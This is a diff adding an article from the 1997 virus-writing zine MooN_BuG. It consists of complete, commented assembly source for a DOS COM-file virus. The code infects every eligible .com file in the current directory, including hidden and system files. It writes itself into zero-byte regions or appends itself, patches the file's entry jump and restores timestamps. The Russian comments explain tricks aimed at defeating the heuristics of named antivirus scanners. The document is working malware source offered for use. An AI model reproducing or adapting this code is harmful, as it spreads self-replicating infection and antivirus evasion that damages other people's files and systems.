@@ -1,0 +1,300 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 4, Dec 1997                                           file 004
+
+; нерезидентный файловый СОМ вирус,
+; записывает себя в область нулевых байт, при отсутствии
+; такой в конец файла...
+; написан исключительно для юзания эвристики разных авирей...
+; деструкции никакой, кроме не обнаруженных глюков ;)))
+;                                           (c) North Rabbit '97
+
+model tiny
+locals
+jumps
+codeseg
+
+startupcode
+Loc_Virus EQU $
+       call start
+             db 055h
+             db 0AAh
+Handle       dw ?
+newBegin     db 0E9h
+             dw ?     ; смещение для jmp
+             db 055h
+             db 0AAh
+             db 90h
+OriginByte label
+             nop
+             nop
+             nop
+             nop
+             int 20h
+
+count_zero   dw 0
+CloseFile    equ $-Loc_Virus
+             db 03Eh
+FunWriteFile equ $-Loc_Virus
+             db 040h
+
+DTA          EQU 0F000h  ; 61440 byte len file
+FileMask     EQU DTA+080h
+OldDTA       EQU FileMask+6
+o24          EQU OldDTA+2
+s24          EQU OldDTA+4
+
+;**************************************************
+; забивает тело вируса нулями, то есть восстанавливает
+; оригинальное тело носителя и передает ему управление
+proc DeCoder
+      mov di,bp
+      add di,100h
+      xor ax,ax
+      rep stosb
+endp DeCoder
+Len_DeCoder=$-DeCoder
+;**************************************************
+; ищет последовательность нулей, если в конце файла
+; присутствуют нули то тоже пойдет ;))
+proc seeklocate
+      mov word ptr[es:di+15h],0 ; читать файл с начала
+      push es
+
+      mov ax,cs
+      dec ax
+      mov es,ax     ; MCB
+      mov bx,[es:3] ; размер выделенной памяти
+      add ax,1001h  ; куча для буфера
+      mov es,ax
+
+      push ds
+      push es
+      pop ds
+
+      mov ax,3F00h
+      mov bx,[bp+Handle]
+      mov cx,[cs:DTA+1Ah]
+      mov dx,0
+      int 21h
+
+      pop ds
+      xchg ax,cx
+      mov bx,dx
+scan1:
+      cmp byte ptr[es:0+bx],0
+      je scan2
+      xor dx,dx    ; обнулить счетчик
+      jmp scan3
+scan2:
+      inc dx       ; счетчик нулей
+      cmp dx,Len_Virus
+      jb scan3
+      mov cx,1     ; выход из loop
+scan3:
+      inc bx
+      loop scan1
+      sub bx,dx    ; смещение начала нуле в проге
+      mov [bp+count_zero], dx ; количество нулей !!
+      pop es
+      ret
+endp seeklocate
+;**************************************************
+; выводит имя зараженного файла
+fname db 13 dup('$')
+proc WriteName
+       push bx
+       mov bx,DTA+1Eh
+       mov ah,2
+@@m1:
+       mov dl,byte ptr [bx]
+       or dl,dl
+       jz @@m2
+       int 21h
+       inc bx
+       jmp @@m1
+@@m2:
+       pop bx
+       ret
+endp
+
+;***********************************************
+; запись в файл с эвристикой против паутиныча
+public WriteFile
+proc WriteFile
+       mov ax,4000h
+       mov bx,[Handle+bp]
+; Веб мнгновенно замолк от этого старого приема
+; с портами + push ax  pop ax
+       push ax
+       in ax,42h
+       mov si,ax
+       in ax,42h
+       cmp ax,si
+       pop ax
+       jnz @@1
+         RET    ; антивебевщина :)
+@@1:
+       int 21h
+       ret
+endp WriteFile
+;******************************************************
+; а это че такое ???? ;-))
+proc int24my
+       iret
+endp int24my
+;******************************************************
+start:
+       mov bp,0FEFDh
+       add bp,[ds:0FFFCh] ; в ВР смещение виря относительно начала проги
+       cld
+
+       push word ptr [bp][OriginByte]
+       push word ptr [bp][OriginByte+2]
+       push word ptr [bp][OriginByte+4]
+       mov word ptr[ds:0FFFCh],100h-Len_Decoder ; адрес перехода на декодер
+       push word ptr [bp][count_zero]           ; кол-во повторов
+
+       mov ah,2fh
+       int 21h
+       mov word ptr[ds:OldDTA],bx  ; сохранить старое DTA
+       mov ah,1Ah
+       mov dx,DTA
+       int 21h                     ; и установить новое
+; сгенерим маску
+       mov di,FileMask
+       mov ax,'.*'
+       stosw
+       mov ax,'oc'
+       stosw
+       mov ax,006Dh
+       stosw
+;сохраним обработчик 24 прерывания
+       mov ax,3524h
+       int 21h
+       mov [ds:o24],bx
+       mov [ds:s24],es
+; установим свой обработчик 24 прерывания
+       mov ax,2524h
+       mov dx,offset int24my
+       int 21h
+
+       mov ah,4Eh
+       mov dx, FileMask
+       mov cx, 27h ; hidden, read-only, system, arhiv
+
+       jmp short FindAgain
+FindNext:
+       mov ah, byte ptr [bp+CloseFile+100h] ; против эвристики MScan 2.1a
+       int 21h
+       mov ah, 4Fh
+
+FindAgain:
+       int 21h  ; на этот INT ругается Веб - возможно COM-вирус
+       mov ah,4Fh
+       jc @@exit   ; полный аборт !! или кончилиссь файлы
+; сравнить максимальный и минимальные размеры жертвы
+       cmp word ptr [cs:DTA+1Ah], DTA-Len_Virus
+       jae FindAgain ; файл больше 61440-длину вируса
+       cmp word ptr [cs:DTA+1Ah], Len_Virus
+       jbe FindAgain ; слишком мал, подрасти !! ищем дальше !!
+; открыть файл
+       mov ax,3D00h
+       mov dx,DTA+1Eh
+       int 21h
+       jc FindNext ; невозможно открыть, читаем следующий
+       mov [bp+Handle], ax
+       xchg bx,ax
+; читаем
+       mov ah,3Fh
+       mov cx,6
+       mov dx, offset OriginByte ;
+       add dx,bp
+       int 21h
+       jc FindNext
+; а это случаем не переименованный EXE файл
+       cmp word ptr [cs:OriginByte+bp],'ZM'
+       jz FindNext  ; если да, то нам он не подходит, искать следующий !!
+; сравнить на признак зараженности
+       cmp word ptr [cs:OriginByte+bp+3h],0AA55h
+       je FindNext ; а этот уже заражон, ищем дальше !!
+; пошли злобные дела :)
+       push [cs:DTA+16h] ; сохранить
+       push [cs:DTA+18h] ; время и дату файла
+; получить доступ к SFT
+       mov di,18h
+       add di,[bp+Handle]  ; psp -> JFT
+       mov cl,[di]         ; номер дескриптора
+       xor ch,ch
+       mov ah,52h
+       int 21h             ; адрес List of list
+       les di,[es:bx+4]    ; указатель на SFT
+       cmp cx,[es:di+4]    ; дескриптор в этой (первой) SFT
+       jb @@M1             ; так точно !!!
+       sub cx,[es:di+4]
+       les di,[es:di]      ; нет дескриптор во второй SFT
+@@M1:
+       mov ax,59           ; размер SFT
+       mul cl
+       add di,6
+       add di,ax
+; ES:DI - адрес SFT
+       mov byte ptr [es:di+2],2       ; ставим "чтение и запись"
+; ищем нулевые байты в количестве равной длинне виря
+       call SeekLocate
+; в ВХ возвращается смещение
+       mov word ptr[es:di+15h],bx ; переходим на участок заражения
+       sub bx,3 ; минус три байта для технич. нужд
+       mov word ptr [newBegin+bp+1],bx  ; смещение для JMP
+; записать тело вируса
+       mov cx, Len_Virus
+       lea dx, Loc_Virus
+       add dx,bp
+       call WriteFile
+; прыг на облако... тьфу в начало файла
+       mov word ptr[es:di+15h],0
+; записать новое начало
+       mov cx,6
+       lea dx, newBegin
+       add dx,bp
+       call WriteFile
+;************************************************
+; тестовый треп
+       Call WriteName ; имя жертвы на экран
+;************************************************
+; восстановить время и дату файла
+       pop dx ; датa
+       pop cx ; время
+       mov ax,5701h
+       int 21h
+; заражение все файлов в текущем каталоге, это маленький JMP
+       jmp FindNext
+@@exit:
+; востановим старый обработчик 24 прерывания
+       push cs
+       pop es
+       push ds
+       mov ax,2524h
+       mov dx,[ds:o24]
+       mov ds,[ds:s24]
+       int 21h
+       pop ds
+; воостановим страрую DTA
+       mov ah,1Ah
+       mov dx,word ptr[cs:OldDTA]
+       int 21h
+
+       lea si, DeCoder
+       add si,bp
+       mov di, 100h-Len_Decoder
+       mov cx,Len_Decoder
+       rep movsb
+
+       pop cx        ; восстановить значение count_zero
+       pop [ds:104h]
+       pop [ds:102h]
+       pop [ds:100h]
+       ret
+
+Len_Virus EQU $-Loc_Virus
+        END
+
